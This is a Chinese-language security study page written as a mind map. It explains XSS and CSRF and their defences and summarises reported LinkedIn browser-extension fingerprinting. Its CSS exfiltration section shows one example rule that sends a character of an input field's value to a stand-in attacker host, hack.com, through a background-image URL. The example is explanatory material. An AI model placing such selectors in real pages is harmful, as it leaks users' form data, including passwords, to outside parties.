---
title: Security Mind Map
description: 网络安全知识导图，包含 XSS、CSRF、CSS Exfiltration 等常见攻击手段的原理分析和防范措施。
---

## 领域

* [Web Crypto API](/maps/_web/browser/crypto)
* [OAuth](/maps/_web/oauth) - 第三方授权协议的设计原理与安全机制

## 概念

#### XSS 的原理是怎么样的？

XSS（Cross Site Scripting）跨站脚本攻击，通过某种方式将非法代码挂载在 URL、或者后端数据中，以达到让浏览器执行的目的。反射型 XSS 和储存型 XSS 都是利用后端返回的非法脚本直接在前端展示，就得到了执行。DOM-Based XSS 是通过修改源码内容来执行的。比如说，反射型 XSS 可能是一封黑客的邮件，链接参数带上了脚本代码；储存型 XSS 在可视化编辑器中很常见；DOM-Based XSS 可能是执行了一段 URL Hash 里面拿到的文本。

#### XSS 有哪些危害，怎么防范？

XSS 可以用来盗取 Cookie、DDos、篡改数据等。防范最基本要做的就是是后端不应该信任前端传来的数据，并且要做好过滤，把字符转义为 HTML 实体。其次是给 Cookie 设上 http-only。

#### CSRF 攻击原理是怎么样的？

CSRF（Cross Site Request Forgery）跨站请求伪造，主要原理是黑客利用了用户在敏感站点保持的登录态，在另一个用户访问的网页去伪造敏感站点的请求。

#### CSRF 怎么防范？

可以使用 CSRF token 方案。每次用户请求 HTML 都在其中设置一个随机的 Token，在请求时带上。

## 用户追踪技术

#### LinkedIn 如何使用浏览器指纹追踪用户？

LinkedIn 被披露使用激进的"用户指纹"技术追踪用户：页面会加载一个包含 **2953 个浏览器插件**的清单，脚本依次检测用户安装了其中哪些插件，以此生成唯一特征码识别用户。这导致访问 LinkedIn 时控制台可能出现上千个报错。这种追踪方式比传统的 cookie 更隐蔽、更难防范，代表了当前网站用户追踪技术的极端案例。

> #周刊摘录 见：[科技周刊第385期](https://www.ruanyifeng.com/blog/2026/02/weekly-issue-385.html)

## 三剑客

#### CSS Exfiltration 攻击原理是什么？

```css
input[value^=a]{
  background-image: url(http://hack.com/a);
}
```
